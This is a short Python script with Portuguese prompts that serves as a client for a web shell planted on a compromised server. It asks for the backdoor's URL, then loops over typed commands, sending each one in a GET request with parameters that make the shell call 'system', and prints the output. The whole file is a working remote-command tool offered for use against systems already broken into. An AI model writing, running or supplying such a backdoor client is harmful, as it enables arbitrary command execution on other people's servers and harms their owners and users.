#!/bin/python

import os
import requests

print("Script by @wh0001s")
url = input("URL: ")

if url == "":
    print("Informe a URL com a backdoor.")
else:
    print("Informe o cmd para ser executado no backdoor.")
    while 1==1:
        cmd = input("cmd: ")
        os.system("cls || clear")
        print("Comando sendo executado: " + cmd) 
        res = requests.get(url + "?0=system&V1=" + cmd)
        print("\n"+res.text)
